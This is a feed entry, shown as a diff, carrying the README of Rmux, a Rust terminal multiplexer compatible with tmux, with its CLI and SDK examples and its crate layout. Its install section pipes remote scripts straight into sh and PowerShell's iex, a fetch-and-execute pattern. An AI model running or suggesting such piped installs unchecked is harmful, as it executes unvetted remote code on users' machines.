+&lt;/doc&gt;</content><link href="https://www.seangoedecke.com/the-o3-geoguessr-prompt-did-not-work/"/><published>2026-05-21T08:52:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48219918</id><title>Show HN: Rmux – A programmable terminal multiplexer with a Playwright-style SDK</title><updated>2026-05-21T10:28:30.473844+00:00</updated><content>&lt;doc fingerprint="a00dd9da450ff7ce"&gt;
+  &lt;main&gt;
+    &lt;p&gt;Universal Rust multiplexer for the agentic era: detachable, scriptable, and inspectable, with a tmux-compatible CLI, daemon-backed SDK, and native Ratatui integration.&lt;/p&gt;
+    &lt;p&gt;English · Français · 简体中文 · 日本語&lt;/p&gt;
+    &lt;p&gt;Important&lt;/p&gt;
+    &lt;p&gt;Current release: v0.2.0, published on 18 May 2026. All 90 tmux-compatible commands are implemented, but bugs are expected — this is a fresh public preview. Please file issues if you hit one.&lt;/p&gt;
+    &lt;p&gt;RMUX exists because I believe the tmux use case has only been partially explored. My own starting point was simple: I wanted to run long-lived agents over SSH without losing their terminals, while still being able to inspect, script, and orchestrate everything around them.&lt;/p&gt;
+    &lt;p&gt;So I rebuilt that idea from scratch in Rust: a blazing-fast, tmux-compatible multiplexer with a typed SDK, persistent sessions, structured snapshots, and native local transports on Linux, macOS, and Windows, including Windows Named Pipes. No WSL required.&lt;/p&gt;
+    &lt;p&gt;RMUX is usable by agents, headless CLI workflows, and humans alike: you can give terminal apps detachable execution, reconnect later, inspect their state, drive them from code, or simply use it for normal tmux-style terminal work.&lt;/p&gt;
+    &lt;p&gt;Short, real examples of what RMUX can be used for.&lt;/p&gt;
+    &lt;table&gt;
+      &lt;row&gt;
+        &lt;cell&gt;
+          &lt;p&gt;Multi Agents Orchestration&lt;/p&gt;
+          &lt;p&gt;≃ 514 lines&lt;/p&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;
+          &lt;p&gt;Agent Broadcast Arena&lt;/p&gt;
+          &lt;p&gt;≃ 2,171 lines&lt;/p&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;
+          &lt;p&gt;Mini-Zellij&lt;/p&gt;
+          &lt;p&gt;≃ 944 lines&lt;/p&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;
+          &lt;p&gt;Terminal &amp;lt;&amp;gt; Browser Mirroring&lt;/p&gt;
+          &lt;p&gt;≃ 649 lines&lt;/p&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;
+          &lt;p&gt;Playwright Testing&lt;/p&gt;
+          &lt;p&gt;≃ 1,495 lines&lt;/p&gt;
+        &lt;/cell&gt;
+      &lt;/row&gt;
+    &lt;/table&gt;
+    &lt;p&gt;Prebuilt binary for macOS and Linux:&lt;/p&gt;
+    &lt;code&gt;curl -fsSL https://rmux.io/install.sh | sh&lt;/code&gt;
+    &lt;p&gt;Prebuilt binary for Windows PowerShell:&lt;/p&gt;
+    &lt;code&gt;irm https://rmux.io/install.ps1 | iex&lt;/code&gt;
+    &lt;p&gt;Direct downloads and SHA256 checksums are available from the v0.2.0 GitHub Release.&lt;/p&gt;
+    &lt;p&gt;From crates.io with Cargo:&lt;/p&gt;
+    &lt;code&gt;cargo install rmux --locked&lt;/code&gt;
+    &lt;p&gt;From a local checkout:&lt;/p&gt;
+    &lt;code&gt;cargo install --path . --locked&lt;/code&gt;
+    &lt;p&gt;For Rust applications:&lt;/p&gt;
+    &lt;code&gt;cargo add rmux-sdk
+cargo add ratatui-rmux&lt;/code&gt;
+    &lt;p&gt;The full RMUX documentation is available at rmux.io/docs.&lt;/p&gt;
+    &lt;p&gt;It includes installation guides, CLI references, SDK examples, terminal automation examples, and API documentation.&lt;/p&gt;
+    &lt;code&gt;rmux new-session -d -s work
+rmux split-window -h -t work
+rmux send-keys -t work 'echo "hello from rmux"' Enter
+rmux attach-session -t work&lt;/code&gt;
+    &lt;p&gt;Use command help locally:&lt;/p&gt;
+    &lt;code&gt;rmux list-commands
+rmux new-session --help
+rmux split-window --help&lt;/code&gt;
+    &lt;code&gt;[dependencies]
+rmux-sdk = "0.2"
+tokio = { version = "1", features = ["rt-multi-thread", "macros"] }&lt;/code&gt;
+    &lt;code&gt;use std::time::Duration;
+
+use rmux_sdk::{
+    EnsureSession, EnsureSessionPolicy, Rmux, SessionName, TerminalSizeSpec,
+};
+
+#[tokio::main]
+async fn main() -&amp;gt; rmux_sdk::Result&amp;lt;()&amp;gt; {
+    let rmux = Rmux::builder()
+        .default_timeout(Duration::from_secs(5))
+        .connect_or_start()
+        .await?;
+
+    let session_name = SessionName::new("work").expect("valid session name");
+    let session = rmux
+        .ensure_session(
+            EnsureSession::named(session_name)
+                .policy(EnsureSessionPolicy::CreateOrReuse)
+                .detached(true)
+                .size(TerminalSizeSpec::new(120, 32)),
+        )
+        .await?;
+
+    let pane = session.pane(0, 0);
+    pane.send_text("printf 'ready\\n' &amp;amp;&amp;amp; sleep 1\n").await?;
+
+    pane.wait_for_text("ready").await?;
+    let snapshot = pane.snapshot().await?;
+    println!("{}x{}", snapshot.cols, snapshot.rows);
+
+    Ok(())
+}&lt;/code&gt;
+    &lt;code&gt;use ratatui::{buffer::Buffer, layout::Rect, widgets::Widget};
+use ratatui_rmux::{PaneState, PaneWidget};
+use rmux_sdk::PaneSnapshot;
+
+fn render(snapshot: PaneSnapshot, area: Rect, buffer: &amp;amp;mut Buffer) {
+    let state = PaneState::from_snapshot(snapshot);
+    PaneWidget::new(&amp;amp;state).render(area, buffer);
+}&lt;/code&gt;
+    &lt;p&gt;Three public surfaces — a &lt;code&gt;rmux&lt;/code&gt; CLI, a &lt;code&gt;rmux-sdk&lt;/code&gt; Rust crate, and a &lt;code&gt;ratatui-rmux&lt;/code&gt; widget — share a single local protocol to talk to the daemon. Anything one surface can do, the others can do too.&lt;/p&gt;
+    &lt;table&gt;
+      &lt;row span="3"&gt;
+        &lt;cell role="head"&gt;Crate&lt;/cell&gt;
+        &lt;cell role="head"&gt;Role&lt;/cell&gt;
+        &lt;cell role="head"&gt;Publication&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-types&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Shared platform-neutral value types&lt;/cell&gt;
+        &lt;cell&gt;public&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-proto&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Detached IPC DTOs, framing, wire-safe errors&lt;/cell&gt;
+        &lt;cell&gt;public&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-os&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Small OS boundary helpers&lt;/cell&gt;
+        &lt;cell&gt;public&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-ipc&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Local IPC endpoints and transports&lt;/cell&gt;
+        &lt;cell&gt;public&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-sdk&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Daemon-backed Rust SDK&lt;/cell&gt;
+        &lt;cell&gt;public&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;ratatui-rmux&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Ratatui integration widget&lt;/cell&gt;
+        &lt;cell&gt;public&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-pty&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;PTY allocation, resize, child process control&lt;/cell&gt;
+        &lt;cell&gt;support crate&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-core&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Sessions, panes, layouts, formats, hooks, buffers&lt;/cell&gt;
+        &lt;cell&gt;support crate&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-server&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Tokio daemon and request dispatch&lt;/cell&gt;
+        &lt;cell&gt;support crate&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-client&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Local IPC client and attach plumbing&lt;/cell&gt;
+        &lt;cell&gt;support crate&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="3"&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;CLI and hidden daemon entrypoint&lt;/cell&gt;
+        &lt;cell&gt;public binary&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row&gt;
+        &lt;cell&gt;
+          &lt;code&gt;rmux-render-core&lt;/code&gt;
+        &lt;/cell&gt;
+        &lt;cell&gt;Shared snapshot rendering core&lt;/cell&gt;
+        &lt;cell&gt;workspace-internal&lt;/cell&gt;
+      &lt;/row&gt;
+    &lt;/table&gt;
+    &lt;table&gt;
+      &lt;row span="4"&gt;
+        &lt;cell role="head"&gt;Platform&lt;/cell&gt;
+        &lt;cell role="head"&gt;PTY backend&lt;/cell&gt;
+        &lt;cell role="head"&gt;IPC backend&lt;/cell&gt;
+        &lt;cell role="head"&gt;Default endpoint&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="4"&gt;
+        &lt;cell&gt;Linux&lt;/cell&gt;
+        &lt;cell&gt;Unix PTY&lt;/cell&gt;
+        &lt;cell&gt;Unix socket&lt;/cell&gt;
+        &lt;cell&gt;
+          &lt;code&gt;/tmp/rmux-{uid}/default&lt;/code&gt;
+        &lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="4"&gt;
+        &lt;cell&gt;macOS&lt;/cell&gt;
+        &lt;cell&gt;Unix PTY&lt;/cell&gt;
+        &lt;cell&gt;Unix socket&lt;/cell&gt;
+        &lt;cell&gt;
+          &lt;code&gt;/tmp/rmux-{uid}/default&lt;/code&gt;
+        &lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row&gt;
+        &lt;cell&gt;Windows&lt;/cell&gt;
+        &lt;cell&gt;ConPTY&lt;/cell&gt;
+        &lt;cell&gt;Named pipe&lt;/cell&gt;
+        &lt;cell&gt;per-user named pipe&lt;/cell&gt;
+      &lt;/row&gt;
+    &lt;/table&gt;
+    &lt;p&gt;On Linux and macOS, RMUX reads &lt;code&gt;.rmux.conf&lt;/code&gt; from the standard system and user locations:&lt;/p&gt;
+    &lt;list rend="ol"&gt;
+      &lt;item&gt;
+        &lt;code&gt;/etc/rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+      &lt;item&gt;
+        &lt;code&gt;~/.rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+      &lt;item&gt;
+        &lt;code&gt;$XDG_CONFIG_HOME/rmux/rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+      &lt;item&gt;
+        &lt;code&gt;~/.config/rmux/rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+    &lt;/list&gt;
+    &lt;p&gt;On Windows, RMUX reads &lt;code&gt;.rmux.conf&lt;/code&gt; as well, from the following locations:&lt;/p&gt;
+    &lt;list rend="ol"&gt;
+      &lt;item&gt;
+        &lt;code&gt;%XDG_CONFIG_HOME%\rmux\rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+      &lt;item&gt;
+        &lt;code&gt;%USERPROFILE%\.rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+      &lt;item&gt;
+        &lt;code&gt;%APPDATA%\rmux\rmux.conf&lt;/code&gt;
+      &lt;/item&gt;
+      &lt;item&gt;
+        &lt;code&gt;%RMUX_CONFIG_FILE%&lt;/code&gt;
+      &lt;/item&gt;
+    &lt;/list&gt;
+    &lt;p&gt;The workspace is designed to be checked from source with locked dependencies:&lt;/p&gt;
+    &lt;code&gt;cargo fmt --all -- --check
+cargo clippy --workspace --all-targets --locked -- -D warnings
+cargo test --workspace --locked --no-fail-fast&lt;/code&gt;
+    &lt;p&gt;Additional local checks:&lt;/p&gt;
+    &lt;code&gt;scripts/cfg-check.sh
+scripts/unsafe-check.sh
+scripts/no-network-in-runtime.sh
+scripts/check-platform-neutrality.sh
+scripts/ratatui-rmux-budget.sh
+scripts/verify-package.sh&lt;/code&gt;
+    &lt;p&gt;Release artifact checks are driven by:&lt;/p&gt;
+    &lt;code&gt;scripts/release-local.sh
+scripts/package-unix.sh&lt;/code&gt;
+    &lt;p&gt;&lt;code&gt;#![forbid(unsafe_code)]&lt;/code&gt; is used in the upper-level crates. OS and terminal boundary code is isolated in the lower-level runtime crates.&lt;/p&gt;
+    &lt;p&gt;RMUX is dual-licensed under either:&lt;/p&gt;
+    &lt;p&gt;at your option.&lt;/p&gt;
+  &lt;/main&gt;
+  &lt;comments/&gt;
+&lt;/doc&gt;</content><link href="https://github.com/helvesec/rmux"/><published>2026-05-21T09:22:00+00:00</published></entry></feed>
